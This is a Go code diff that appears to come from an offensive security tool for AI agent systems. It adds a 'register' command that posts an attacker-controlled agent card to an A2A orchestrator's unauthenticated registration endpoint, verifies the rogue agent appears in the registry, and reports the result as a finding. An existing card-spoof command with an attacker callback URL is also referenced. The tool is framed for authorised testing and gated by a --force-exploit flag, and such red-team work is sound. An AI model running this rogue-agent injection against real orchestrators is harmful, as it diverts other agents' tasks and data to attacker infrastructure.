@@ -62,6 +62,13 @@ var (
 
 	// card-spoof
 	a2aCardURL string
+
+	a2aRegisterPath string
+	a2aListPath     string
+	a2aRogueName    string
+	a2aRogueURL     string
+	a2aRogueDesc    string
+	a2aRogueSkills  []string
 )
 
 var a2aClientFactory = newA2AClient
@@ -149,6 +156,21 @@ what landed to takeover-capable (listener-confirmed). The in-process listener is
 https://. Single-node. Submits a task; requires --force-exploit.`,
 	Example: formatCommandExample("a2a --target http://127.0.0.1:8000 card-spoof --callback-url http://10.0.0.5:8000/card --force-exploit"),
 	RunE:    runA2ACardSpoof,
+}
+
+var a2aRegisterCmd = &cobra.Command{
+	Use:   "register",
+	Short: "Register a rogue agent with an orchestrator's registry (requires --force-exploit)",
+	Long: `Post an attacker-controlled agent card to an A2A orchestrator's registration endpoint
+(--register-path, default /agents/register). If the orchestrator accepts unauthenticated
+registrations, the rogue agent — pointed at --agent-url (attacker infra) and advertising --skill
+capabilities — is added to the registry and becomes dispatchable, so the orchestrator routes
+matching tasks to it (a confused-deputy / rogue-agent-injection weakness).
+
+Registration accepted is reported as influenced; presence in the registry listing (--list-path,
+default /agents) corroborates it. Mutates the orchestrator's registry; requires --force-exploit.`,
+	Example: formatCommandExample("a2a --target http://127.0.0.1:8000 register --agent-url http://10.0.0.5:9000 --skill data-analysis --force-exploit"),
+	RunE:    runA2ARegister,
 }
 
 var a2aSkillsCmd = &cobra.Command{
@@ -310,7 +332,15 @@ func init() {
 	a2aReplayCmd.Flags().StringVar(&a2aReplayMessage, "message", "", "Message to replay (required)")
 	a2aReplayCmd.Flags().StringVar(&a2aOriginalTaskID, "original-task-id", "", "Task id of the original request (for correlation)")
 
+	a2aRegisterCmd.Flags().StringVar(&a2aRegisterPath, "register-path", "/agents/register", "Orchestrator registration endpoint path")
+	a2aRegisterCmd.Flags().StringVar(&a2aListPath, "list-path", "/agents", "Registry listing endpoint path (for verification)")
+	a2aRegisterCmd.Flags().StringVar(&a2aRogueName, "agent-name", "aipostex-rogue-agent", "Name of the rogue agent to register")
+	a2aRegisterCmd.Flags().StringVar(&a2aRogueURL, "agent-url", "", "URL the orchestrator will route to — attacker-controlled (required)")
+	a2aRegisterCmd.Flags().StringVar(&a2aRogueDesc, "description", "General-purpose analysis agent", "Rogue agent description")
+	a2aRegisterCmd.Flags().StringSliceVar(&a2aRogueSkills, "skill", []string{"analysis"}, "Advertised skill id(s) so the orchestrator dispatches matching tasks")
+
 	a2aCmd.AddCommand(
+		a2aRegisterCmd,
 		a2aEnumCmd,
 		a2aAuthProbeCmd,
 		a2aMsgIntegrityCmd,
@@ -597,6 +627,68 @@ func runA2ACardSpoof(cmd *cobra.Command, args []string) error {
 	return writeExploitFindingsWithSummary([]report.Finding{finding}, &exploitSummary{
 		Module: "a2a", Action: "card-spoof", ResourcesEnumerated: 1, Mutating: true,
 		WorkflowPlans: []workflowPlan{a2aPlan},
+	})
+}
+
+func runA2ARegister(cmd *cobra.Command, args []string) error {
+	if err := requireForceExploit("a2a register"); err != nil {
+		return err
+	}
+	if strings.TrimSpace(a2aRogueURL) == "" {
+		return missingFlagError("agent-url", formatCommandExample("a2a --target http://127.0.0.1:8000 register --agent-url http://10.0.0.5:9000 --force-exploit"))
+	}
+	client, _, err := a2aClientFactory()
+	if err != nil {
+		return err
+	}
+	res, err := client.RegisterAgent(a2aRegisterPath, a2aListPath, a2a.RogueSpec{
+		Name:        a2aRogueName,
+		Description: a2aRogueDesc,
+		URL:         a2aRogueURL,
+		Skills:      a2aRogueSkills,
+	})
+	if err != nil {
+		return fmt.Errorf("A2A rogue registration: %w", err)
+	}
+
+	severity := report.SeverityInfo
+	landed := "reachable"
+	stage := "recon"
+	title := fmt.Sprintf("A2A rogue-agent registration rejected on %s (HTTP %d)", a2aTarget, res.StatusCode)
+	desc := fmt.Sprintf("The orchestrator rejected an unauthenticated agent registration at %s.", res.Endpoint)
+	switch {
+	case res.Accepted && res.ListedInRegistry:
+		severity = report.SeverityHigh
+		stage, landed = "impact", "influenced"
+		title = fmt.Sprintf("A2A rogue agent registered AND present in orchestrator registry on %s", a2aTarget)
+		desc = fmt.Sprintf("An unauthenticated rogue agent %q (url=%s) was registered at %s and now appears in the registry listing — the orchestrator will dispatch matching tasks to attacker-controlled infrastructure (rogue-agent injection / confused deputy).", a2aRogueName, safeLabel(a2aRogueURL), res.Endpoint)
+	case res.Accepted:
+		severity = report.SeverityHigh
+		stage, landed = "impact", "influenced"
+		title = fmt.Sprintf("A2A accepts unauthenticated rogue-agent registration on %s", a2aTarget)
+		desc = fmt.Sprintf("An unauthenticated rogue agent %q (url=%s) was accepted at %s (registry presence not confirmed via --list-path). The orchestrator may dispatch matching tasks to attacker-controlled infrastructure.", a2aRogueName, safeLabel(a2aRogueURL), res.Endpoint)
+	}
+
+	finding := newExploitFinding(
+		report.SourceA2A, a2aTarget, title, severity, desc,
+		map[string]interface{}{
+			"module": "a2a", "action": "register", "mutating": true, "provider": "a2a",
+			"register_endpoint":     res.Endpoint,
+			"rogue_name":            a2aRogueName,
+			"rogue_url":             a2aRogueURL,
+			"registration_accepted": res.Accepted,
+			"listed_in_registry":    res.ListedInRegistry,
+			"status_code":           res.StatusCode,
+		},
+	)
+	finding.Evidence = res.Evidence
+	finding.Metadata = applyStageLanded(finding.Metadata, stage, landed, "a2a-register", "rogue-agent")
+	registerPlan := buildA2AOffensiveWorkflowPlan(a2aTarget, "register", "")
+	finding.Metadata = attachWorkflowToMetadata(finding.Metadata, registerPlan)
+	infof("A2A register: accepted=%t listed=%t url=%s", res.Accepted, res.ListedInRegistry, safeLabel(a2aRogueURL))
+	return writeExploitFindingsWithSummary([]report.Finding{finding}, &exploitSummary{
+		Module: "a2a", Action: "register", ResourcesEnumerated: 1, Mutating: true,
+		WorkflowPlans: []workflowPlan{registerPlan},
 	})
 }
 
